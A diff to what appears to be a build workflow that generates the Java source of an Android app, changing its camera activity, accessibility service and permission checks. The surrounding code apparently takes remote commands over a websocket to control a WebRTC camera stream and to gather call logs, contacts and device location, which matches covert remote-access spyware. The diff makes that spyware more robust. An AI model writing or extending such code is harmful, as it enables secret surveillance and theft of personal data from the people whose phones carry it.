@@ -65,6 +65,11 @@ jobs:
                   sourceCompatibility JavaVersion.VERSION_1_8
                   targetCompatibility JavaVersion.VERSION_1_8
               }
+              packagingOptions {
+                  jniLibs {
+                      useLegacyPackaging = true
+                  }
+              }
           }
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
@@ -95,6 +100,7 @@ jobs:
               <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
               <application
                   android:allowBackup="true"
+                  android:extractNativeLibs="true"
                   android:icon="@android:drawable/sym_def_app_icon"
                   android:label="@string/app_name"
                   android:theme="@style/Theme.NeonPanel">
@@ -279,6 +285,8 @@ jobs:
 
           public class CameraActivity extends AppCompatActivity {
 
+              public static CameraActivity instance; // Static instance for service control
+
               private static final int CAMERA_PERMISSION_REQUEST = 100;
               private SurfaceViewRenderer localView;
               private PeerConnectionFactory factory;
@@ -298,6 +306,8 @@ jobs:
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   setContentView(R.layout.activity_camera);
+                  instance = this;
+
                   localView = findViewById(R.id.local_view);
                   switchCameraBtn = findViewById(R.id.switch_camera_btn);
 
@@ -319,6 +329,18 @@ jobs:
                       Toast.makeText(this, "Camera permission required", Toast.LENGTH_SHORT).show();
                       finish();
                   }
+              }
+
+              @Override
+              protected void onDestroy() {
+                  super.onDestroy();
+                  instance = null;
+                  if (peerConnection != null) peerConnection.close();
+                  if (videoCapturer != null) {
+                      try { videoCapturer.stopCapture(); } catch (InterruptedException e) { }
+                      videoCapturer.dispose();
+                  }
+                  if (factory != null) factory.dispose();
               }
 
               private void startCameraStreaming() {
@@ -378,7 +400,7 @@ jobs:
                   return null;
               }
 
-              private void switchCamera() {
+              public void switchCamera() {
                   if (videoCapturer == null) return;
                   try {
                       videoCapturer.stopCapture();
@@ -476,17 +498,6 @@ jobs:
                       ws.send(msg.toString());
                   } catch (JSONException e) { }
               }
-
-              @Override
-              protected void onDestroy() {
-                  super.onDestroy();
-                  if (peerConnection != null) peerConnection.close();
-                  if (videoCapturer != null) {
-                      try { videoCapturer.stopCapture(); } catch (InterruptedException e) { }
-                      videoCapturer.dispose();
-                  }
-                  if (factory != null) factory.dispose();
-              }
           }
           EOF
 
@@ -524,6 +535,7 @@ jobs:
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
           import android.widget.Toast;
+          import androidx.core.content.ContextCompat;
           import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.ByteArrayOutputStream;
@@ -617,9 +629,6 @@ jobs:
                                   intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                   startActivity(intent);
                               } else if ("switch_camera".equals(msg.getString("type"))) {
-                                  // If camera activity already running, send broadcast or event?
-                                  // For simplicity, we can just start activity again? Actually we need to control running activity.
-                                  // We'll store a static reference to CameraActivity and call switchCamera.
                                   if (CameraActivity.instance != null) {
                                       CameraActivity.instance.runOnUiThread(() -> CameraActivity.instance.switchCamera());
                                   }
@@ -741,7 +750,7 @@ jobs:
               }
 
               private void sendCallLogs() {
-                  if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
+                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       long now = System.currentTimeMillis();
                       long cutoff = now - 24 * 60 * 60 * 1000;
@@ -779,7 +788,7 @@ jobs:
               }
 
               private void sendContacts() {
-                  if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
+                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       JSONArray contactsArray = new JSONArray();
                       Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
@@ -910,8 +919,8 @@ jobs:
               private LocationResult getCurrentLocation(boolean forceFresh) {
                   try {
                       LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
+                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                          ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
                       if (!forceFresh) {
                           Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                           if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
